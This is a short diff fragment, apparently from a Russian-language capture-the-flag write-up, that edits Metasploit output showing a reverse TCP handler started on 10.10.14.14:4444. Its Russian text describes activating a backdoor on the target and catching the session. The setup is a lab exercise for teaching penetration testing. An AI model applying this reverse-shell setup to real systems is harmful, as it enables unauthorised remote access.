@@ -708,7 +708,7 @@ Exploit target:
 
 msf exploit(multi/handler) > run
 
-	[*] Started reverse TCP handler on 10.10.14.14:4444
+[*] Started reverse TCP handler on 10.10.14.14:4444
 ```
 
 Активируем бэкдор на прометее и ловим сессию:
